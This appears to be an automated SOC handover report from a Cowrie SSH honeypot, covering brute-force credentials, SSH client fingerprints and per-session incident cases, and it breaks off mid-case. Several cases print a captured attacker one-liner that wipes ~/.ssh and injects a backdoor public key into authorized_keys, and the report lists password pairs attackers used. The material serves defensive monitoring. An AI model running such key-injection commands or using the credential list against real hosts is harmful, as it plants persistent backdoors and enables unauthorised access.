# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T20:43:54Z |
| **Shift Time** | 20:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **99** |
| Confirmed Threats | **65** |
| False Positives Filtered | **34** (34.3%) |
| Unique Attacker IPs | **9** |
| Countries of Origin | **6** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **76** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **52** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **15** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 10 |
| `n8n` | 3 |
| `test` | 2 |
| `ftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `123456` | 2 |
| `test.` | 1 |
| `!QAZ@WSX1qaz2wsx` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `test` | `test.` | 1 |
| `root` | `!QAZ@WSX1qaz2wsx` | 1 |
| `ftpuser` | `ftpuserpassword` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!QAZ@WSX1qaz2wsx` | `172.173.117.246` | 2026-04-25T19:09:28 |
| `root` | `3245gs5662d34` | `172.173.117.246` | 2026-04-25T19:09:34 |
| `root` | `202500` | `172.173.117.246` | 2026-04-25T19:11:22 |
| `root` | `Lq123456` | `172.173.117.246` | 2026-04-25T19:12:21 |
| `root` | `senha` | `172.173.117.246` | 2026-04-25T19:17:25 |
| `root` | `MoeClub.org` | `172.173.117.246` | 2026-04-25T19:18:27 |
| `root` | `Xp123456` | `172.173.117.246` | 2026-04-25T19:19:28 |
| `root` | `Pa$$w0rd2025` | `172.173.117.246` | 2026-04-25T19:20:30 |
| `root` | `1233211234` | `172.173.117.246` | 2026-04-25T19:23:35 |
| `root` | `!QAZ2wsx` | `161.35.41.153` | 2026-04-25T19:24:02 |
| `root` | `------fuck------` | `36.140.37.212` | 2026-04-25T19:24:52 |
| `root` | `admin1@3` | `172.173.117.246` | 2026-04-25T19:27:42 |
| `root` | `2glehe5t24th1issZs` | `172.173.117.246` | 2026-04-25T19:29:44 |
| `root` | `P` | `47.159.179.48` | 2026-04-25T20:04:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **99** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 47 | 2 |
| `19532158b559...` | Mirai/variant | 3 | 1 |
| `16443846184e...` | Generic scanner | 2 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 47 | 2 | libssh-based |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.173.117.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **9** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 9 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b46621c4e40f

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:09 |
| **Last Seen** | 2026-04-25 19:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:09:27` | `cowrie.session.connect` |
| `2026-04-25 19:09:27` | `cowrie.client.version` |
| `2026-04-25 19:09:27` | `cowrie.client.kex` |
| `2026-04-25 19:09:28` | `cowrie.login.success` |
| `2026-04-25 19:09:28` | `cowrie.session.params` |
| `2026-04-25 19:09:28` | `cowrie.command.input` |
| `2026-04-25 19:09:28` | `cowrie.command.failed` |
| `2026-04-25 19:09:29` | `cowrie.log.closed` |
| `2026-04-25 19:09:29` | `cowrie.session.params` |
| `2026-04-25 19:09:29` | `cowrie.command.input` |
| `2026-04-25 19:09:29` | `cowrie.session.file_download` |
| `2026-04-25 19:09:29` | `cowrie.log.closed` |
| `2026-04-25 19:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4037b61f675

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:09 |
| **Last Seen** | 2026-04-25 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:09:32` | `cowrie.session.connect` |
| `2026-04-25 19:09:32` | `cowrie.client.version` |
| `2026-04-25 19:09:33` | `cowrie.client.kex` |
| `2026-04-25 19:09:34` | `cowrie.login.success` |
| `2026-04-25 19:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0d6874337b

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:11 |
| **Last Seen** | 2026-04-25 19:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:11:21` | `cowrie.session.connect` |
| `2026-04-25 19:11:21` | `cowrie.client.version` |
| `2026-04-25 19:11:21` | `cowrie.client.kex` |
| `2026-04-25 19:11:22` | `cowrie.login.success` |
| `2026-04-25 19:11:23` | `cowrie.session.params` |
| `2026-04-25 19:11:23` | `cowrie.command.input` |
| `2026-04-25 19:11:23` | `cowrie.command.failed` |
| `2026-04-25 19:11:23` | `cowrie.log.closed` |
| `2026-04-25 19:11:24` | `cowrie.session.params` |
| `2026-04-25 19:11:24` | `cowrie.command.input` |
| `2026-04-25 19:11:24` | `cowrie.session.file_download` |
| `2026-04-25 19:11:24` | `cowrie.log.closed` |
| `2026-04-25 19:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8693b440bb5

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:11 |
| **Last Seen** | 2026-04-25 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:11:27` | `cowrie.session.connect` |
| `2026-04-25 19:11:27` | `cowrie.client.version` |
| `2026-04-25 19:11:27` | `cowrie.client.kex` |
| `2026-04-25 19:11:28` | `cowrie.login.success` |
| `2026-04-25 19:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95cdd80befd9

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:12 |
| **Last Seen** | 2026-04-25 19:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:12:20` | `cowrie.session.connect` |
| `2026-04-25 19:12:20` | `cowrie.client.version` |
| `2026-04-25 19:12:20` | `cowrie.client.kex` |
| `2026-04-25 19:12:21` | `cowrie.login.success` |
| `2026-04-25 19:12:22` | `cowrie.session.params` |
| `2026-04-25 19:12:22` | `cowrie.command.input` |
| `2026-04-25 19:12:22` | `cowrie.command.failed` |
| `2026-04-25 19:12:22` | `cowrie.log.closed` |
| `2026-04-25 19:12:23` | `cowrie.session.params` |
| `2026-04-25 19:12:23` | `cowrie.command.input` |
| `2026-04-25 19:12:23` | `cowrie.session.file_download` |
| `2026-04-25 19:12:23` | `cowrie.log.closed` |
| `2026-04-25 19:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28539d7ba2d3

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:12 |
| **Last Seen** | 2026-04-25 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:12:26` | `cowrie.session.connect` |
| `2026-04-25 19:12:26` | `cowrie.client.version` |
| `2026-04-25 19:12:26` | `cowrie.client.kex` |
| `2026-04-25 19:12:27` | `cowrie.login.success` |
| `2026-04-25 19:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e098204a45b8

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:17 |
| **Last Seen** | 2026-04-25 19:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:17:24` | `cowrie.session.connect` |
| `2026-04-25 19:17:24` | `cowrie.client.version` |
| `2026-04-25 19:17:25` | `cowrie.client.kex` |
| `2026-04-25 19:17:25` | `cowrie.login.success` |
| `2026-04-25 19:17:26` | `cowrie.session.params` |
| `2026-04-25 19:17:26` | `cowrie.command.input` |
| `2026-04-25 19:17:26` | `cowrie.command.failed` |
| `2026-04-25 19:17:26` | `cowrie.log.closed` |
| `2026-04-25 19:17:27` | `cowrie.session.params` |
| `2026-04-25 19:17:27` | `cowrie.command.input` |
| `2026-04-25 19:17:27` | `cowrie.session.file_download` |
| `2026-04-25 19:17:27` | `cowrie.log.closed` |
| `2026-04-25 19:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec9b0d0c5dd1

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:17 |
| **Last Seen** | 2026-04-25 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:17:30` | `cowrie.session.connect` |
| `2026-04-25 19:17:30` | `cowrie.client.version` |
| `2026-04-25 19:17:30` | `cowrie.client.kex` |
| `2026-04-25 19:17:31` | `cowrie.login.success` |
| `2026-04-25 19:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37922840e6a9

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:18 |
| **Last Seen** | 2026-04-25 19:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:18:25` | `cowrie.session.connect` |
| `2026-04-25 19:18:25` | `cowrie.client.version` |
| `2026-04-25 19:18:26` | `cowrie.client.kex` |
| `2026-04-25 19:18:27` | `cowrie.login.success` |
| `2026-04-25 19:18:27` | `cowrie.session.params` |
| `2026-04-25 19:18:27` | `cowrie.command.input` |
| `2026-04-25 19:18:27` | `cowrie.command.failed` |
| `2026-04-25 19:18:28` | `cowrie.log.closed` |
| `2026-04-25 19:18:28` | `cowrie.session.params` |
| `2026-04-25 19:18:28` | `cowrie.command.input` |
| `2026-04-25 19:18:28` | `cowrie.session.file_download` |
| `2026-04-25 19:18:28` | `cowrie.log.closed` |
| `2026-04-25 19:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21435ef66718

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:18 |
| **Last Seen** | 2026-04-25 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:18:31` | `cowrie.session.connect` |
| `2026-04-25 19:18:31` | `cowrie.client.version` |
| `2026-04-25 19:18:32` | `cowrie.client.kex` |
| `2026-04-25 19:18:32` | `cowrie.login.success` |
| `2026-04-25 19:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65d0f048f6f

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:19 |
| **Last Seen** | 2026-04-25 19:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:19:27` | `cowrie.session.connect` |
| `2026-04-25 19:19:27` | `cowrie.client.version` |
| `2026-04-25 19:19:27` | `cowrie.client.kex` |
| `2026-04-25 19:19:28` | `cowrie.login.success` |
| `2026-04-25 19:19:29` | `cowrie.session.params` |
| `2026-04-25 19:19:29` | `cowrie.command.input` |
| `2026-04-25 19:19:29` | `cowrie.command.failed` |
| `2026-04-25 19:19:29` | `cowrie.log.closed` |
| `2026-04-25 19:19:30` | `cowrie.session.params` |
| `2026-04-25 19:19:30` | `cowrie.command.input` |
| `2026-04-25 19:19:30` | `cowrie.session.file_download` |
| `2026-04-25 19:19:30` | `cowrie.log.closed` |
| `2026-04-25 19:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d34900203f

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:19 |
| **Last Seen** | 2026-04-25 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:19:33` | `cowrie.session.connect` |
| `2026-04-25 19:19:33` | `cowrie.client.version` |
| `2026-04-25 19:19:33` | `cowrie.client.kex` |
| `2026-04-25 19:19:34` | `cowrie.login.success` |
| `2026-04-25 19:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb898d692294

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:20 |
| **Last Seen** | 2026-04-25 19:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 19:20:29` | `cowrie.session.connect` |
| `2026-04-25 19:20:29` | `cowrie.client.version` |
| `2026-04-25 19:20:29` | `cowrie.client.kex` |
| `2026-04-25 19:20:30` | `cowrie.login.success` |
| `2026-04-25 19:20:31` | `cowrie.session.params` |
| `2026-04-25 19:20:31` | `cowrie.command.input` |
| `2026-04-25 19:20:31` | `cowrie.command.failed` |
| `2026-04-25 19:20:31` | `cowrie.log.closed` |
| `2026-04-25 19:20:32` | `cowrie.session.params` |
| `2026-04-25 19:20:32` | `cowrie.command.input` |
| `2026-04-25 19:20:32` | `cowrie.session.file_download` |
| `2026-04-25 19:20:32` | `cowrie.log.closed` |
| `2026-04-25 19:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbc5386d257

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-04-25 19:20 |
| **Last Seen** | 2026-04-25 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
